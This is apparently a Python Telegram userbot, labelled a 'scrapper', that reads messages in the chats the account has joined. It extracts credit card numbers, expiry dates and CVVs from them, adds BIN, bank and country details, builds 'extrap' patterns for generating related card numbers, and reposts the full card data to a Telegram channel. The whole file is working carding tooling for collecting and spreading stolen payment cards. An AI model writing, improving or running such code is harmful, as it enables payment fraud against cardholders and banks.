import sys,time
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(00000.05)

logo = '\n\n\n\n\t\t░░░░░▄▄▀▀▀▀▀▀▀▀▀▄▄░░░░░\n\t\t░░░░█░░░░░░░░░░░░░█░░░░\n\t\t░░░█░░░░░░░░░░▄▄▄░░█░░░\n\t\t░░░█░░▄▄▄░░▄░░███░░█░░░\n\t\t░░░▄█░▄░░░▀▀▀░░░▄░█▄░░░\n\t\t░░░█░░▀█▀█▀█▀█▀█▀░░█░░░\n\t\t░░░▄██▄▄▀▀▀▀▀▀▀▄▄██▄░░░\n\t\t░▄█░█▀▀█▀▀▀█▀▀▀█▀▀█░█▄░'
jalan(logo)
jalan('\x1b[1;36m \t\t░░░╔╗╔╗╔══╗╔═╦═╗╔═╗░░░░░░░░\n\t\t░░░║╚╝║║╔╗║║║║║║║║║░░░░░░░░\n\t\t░░░║╔╗║║╠╣║║║║║║║║║░░░░░░░░\n\t\t░░░╚╝╚╝╚╝╚╝╚╩═╩╝╚═╝░░░░░░░░\n\n\n')




from pyrogram import Client, idle
from pyrogram.types import Message
import re
import requests
from checkhamo import checkhamo
from info_bin import _info_bin
from config import API_ID,API_HASH,SESSION,chanel,TOKEN


#################################################################################


#    ░░░░░▄▄▀▀▀▀▀▀▀▀▀▄▄░░░░░
#    ░░░░█░░░░░░░░░░░░░█░░░░
#    ░░░█░░░░░░░░░░▄▄▄░░█░░░
#    ░░░█░░▄▄▄░░▄░░███░░█░░░
#    ░░░▄█░▄░░░▀▀▀░░░▄░█▄░░░
#    ░░░█░░▀█▀█▀█▀█▀█▀░░█░░░
#    ░░░▄██▄▄▀▀▀▀▀▀▀▄▄██▄░░░
#    ░▄█░█▀▀█▀▀▀█▀▀▀█▀▀█░█▄░
#    ░░░╔╗╔╗╔══╗╔═╦═╗╔═╗░░░░
#    ░░░║╚╝║║╔╗║║║║║║║║║░░░░
#    ░░░║╔╗║║╠╣║║║║║║║║║░░░░
#    ░░░╚╝╚╝╚╝╚╝╚╩═╩╝╚═╝░░░░

###############################################################################

# 𝗦𝗖𝗥𝗔𝗣𝗣𝗘𝗥


usr = Client(
    "usersession",
    api_id=API_ID,
    api_hash=API_HASH,
    session_string=SESSION
)
usr.start()
print(" run ")


info_chanel = usr.get_chat(f"{chanel}")
print(info_chanel)
id_chanel = info_chanel.id
print(id_chanel)

hamo_all_cc = []
@usr.on_message()
def telegraph(c: Client, m: Message):
    if m.caption:
        hmo = str(m.caption)
    elif m.text:
        hmo = str(m.text)
    else:
        hmo = "None :("
    try:
        all_cards = hmo.split('\n')
        all_cards = (all_cards[0:50])
        for x in all_cards:
            input = re.findall(r"[0-9]+", x)
            if not input or len(input) < 3:
                    continue 
            if len(input[0]) > 13 and int(input[0][0]) < 7:  
                        
                if len(input) == 3:
                    cc = input[0]
                    if len(input[1]) == 3:
                        mes = input[2][:2]
                        ano = input[2][2:]
                        cvv = input[1]
                    else:
                        mes = input[1][:2]
                        ano = input[1][2:]
                        cvv = input[2]
                else:
                    cc = input[0]
                    if len(input[1]) == 3:
                        mes = input[2]
                        ano = input[3]
                        cvv = input[1]
                    else:
                        mes = input[1]
                        ano = input[2]
                        cvv = input[3]
                    if len(mes) == 2 and (mes > '12' or mes < '01'):
                        ano1 = mes
                        mes = ano
                        ano = ano1
                if len(mes)< 2:
                    mes = "0"+str(mes)
                if len(ano)< 4:
                    ano = "20"+str(ano)
                if len(mes) == 4:
                    mes = mes[:2]
                    ano = mes[2:]
                if str(cc).startswith("4") or str(cc).startswith("5"):
                    cvv = cvv[:3]
                if ano == "":
                    ano = "2027"
                if cc and not checkhamo(cc): pass
                if (cc, mes, ano, cvv):
                    with open(f"hamo_all_cc.txt", 'r') as (hm):
                        haamo = hm.read().split("\n")
                        if cc not in haamo:
                            visa = str(cc +"|"+mes+"|"+ano+"|"+cvv)
                            extrap = str(cc[:12] +"xxxx|"+mes+"|"+ano+"|rnd")
                            all_info_bin = _info_bin(cc)
                            text = f"""
{cc[:6]} ⤈ 『sᴀᴛʏᴀᴍ』

𝚌𝚌 : <code>{visa}</code>

⟐ 𝙴𝚡𝚝𝚛𝚊𝚙
➾ <code>{extrap}</code>

◎ 𝙱𝚒𝚗 ➾ {all_info_bin['Bin']}
◎ 𝙱𝚊𝚗𝚔 ➾ {all_info_bin['Bank']}
◎ 𝙲𝚘𝚞𝚗𝚝𝚛𝚢 ➾ {all_info_bin['Country']}

『sᴀᴛʏᴀᴍ』 ➣  @mr_majnu72
"""
                            if cc not in hamo_all_cc:
                                hamo_all_cc.append(cc)
                                try:
                                    tlg = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={id_chanel}&text={text}&parse_mode=html"
                                    hm = requests.post(tlg).json()
                                    print(hm)
                                except Exception as e:
                                    print(f" Error send message \n{e}")
                                with open(f"hamo_all_cc.txt", 'a') as (f):
                                    f.write(f"{cc}\n")
    except Exception as e:
        print(e)







idle()